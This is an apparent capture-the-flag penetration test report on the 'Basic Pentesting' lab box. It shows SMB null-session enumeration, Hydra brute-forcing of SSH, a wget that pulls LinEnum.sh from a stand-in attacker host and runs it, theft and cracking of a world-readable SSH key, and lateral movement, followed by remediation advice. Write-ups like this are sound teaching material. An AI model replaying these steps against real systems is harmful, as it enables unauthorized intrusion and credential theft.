# Penetration Test Report: Basic Pentesting

**Date:** June 25, 2026
**Target IP:** 10.49.145.188
**Objective:** Boot-to-Root / Capture the Flag

---

## 1. Executive Summary

This report outlines the successful compromise of the target system. The attack path progressed from anonymous external enumeration to gaining an initial foothold via a brute-forced SSH password, followed by lateral movement to a higher-privileged user account. The compromise was facilitated by a combination of weak credentials, informational leaks on the web server, and misconfigured file permissions within user directories.

---

## 2. Reconnaissance & External Enumeration

### Web Enumeration (Port 80 - HTTP)

Initial directory fuzzing and manual enumeration of the web server revealed a hidden directory at `/development`.
Upon exploring this directory, two critical text files were discovered:

* `dev.txt`
* `j.txt`

These files contained developer notes indicating that a user named "J" (later identified as Jan) had a weak password. While the note erroneously referenced the `/etc/shadow` file, the actual intelligence gathered was that Jan's password was easily crackable.

### SMB Enumeration (Ports 139/445 - SMB)

An anonymous null session was successfully established against the SMB service using `smbclient`.

```bash
smbclient -L \\\\10.49.145.188\\ -N 

```

This allowed for the enumeration of shares. Accessing the anonymous share led to the discovery and download of `staff.txt`, which further confirmed the internal usernames.

---

## 3. Initial Access

### SSH Brute-Forcing with Hydra

Leveraging the intelligence gathered from the web server (that user `jan` had a weak password), an online dictionary attack was launched against the SSH service running on Port 22.

The tool **Hydra** was utilized alongside the `rockyou.txt` wordlist to brute-force the credentials.

**Command Executed:**

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.49.145.188

```

* `-l jan`: Specifies the exact login username we are targeting.
* `-P /usr/share/wordlists/rockyou.txt`: Points Hydra to the password list to iterate through.
* `ssh://10.49.145.188`: Directs the attack at the SSH protocol on the target IP.

**Result:** Hydra successfully matched a password.

* **Credentials Secured:** `jan:armando`

An SSH session was then established using these credentials, granting the first interactive shell on the system.

---

## 4. Internal Enumeration

With a low-privileged shell established as `jan`, local system enumeration was performed to identify privilege escalation vectors.

### Automated Enumeration using LinEnum

To automate the discovery of misconfigurations, the `LinEnum.sh` script was deployed to the target.

1. **Hosting the Payload:** A local web server was spun up on the attacking machine.
```bash
python3 -m http.server 8000

```


2. **Transferring to Target:** From the `jan` SSH session, the script was pulled into the `/tmp` directory.
```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

```



### Findings Analysis

While the `/etc/shadow` file was correctly secured (owned by root/shadow), the LinEnum output highlighted the presence of another user on the system: **`kay`**.

Further investigation into the `/home/kay` directory revealed a critical misconfiguration. Although the directory itself had restricted access, the underlying `.ssh` directory and the private RSA key within it were world-readable.

---

## 5. Lateral Movement & Exploitation

### Private Key Exfiltration

The contents of Kay's private SSH key were read using the absolute path:

```bash
cat /home/kay/.ssh/id_rsa

```

The key block was copied and saved locally to the attacking machine as `kay_key`.

### Offline Passphrase Cracking

Attempting to use the key revealed it was protected by a passphrase. The key was prepped for offline cracking using `ssh2john` to extract the hash.

```bash
ssh2john kay_key > kay_hash.txt

```

John the Ripper was then deployed against the hash using the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt

```

* **Passphrase Recovered:** `beeswax`

### Executing the Jump

During the final connection attempt, modern SSH client restrictions on the attacking machine rejected the legacy `ssh-rsa` algorithm used by the target's key.

To bypass this without reconfiguring the local machine, the SSH jump was executed *internally* from the existing `jan` session, which natively supported the legacy protocols.

```bash
ssh -i kay_key kay@localhost

```

Upon entering the passphrase `beeswax`, a shell was successfully spawned as the user `kay`, completing the lateral movement phase and granting higher-level access to the system.

---

## 6. Vulnerability Summary & Remediation

1. **Information Disclosure:** Developer notes (`dev.txt`, `j.txt`) left on the public web server provided actionable intelligence to attackers.
* *Fix:* Remove all sensitive internal documentation from public-facing web directories.


2. **Weak Passwords:** User `jan` utilized a weak, easily guessable password (`armando`) found in standard dictionary lists.
* *Fix:* Enforce a strong password policy requiring length, complexity, and rotational standards.


3. **Insecure File Permissions:** The SSH private key for user `kay` (`/home/kay/.ssh/id_rsa`) was world-readable.
* *Fix:* Ensure all `.ssh` directories are set to `chmod 700` and `id_rsa` files are strictly set to `chmod 600`.
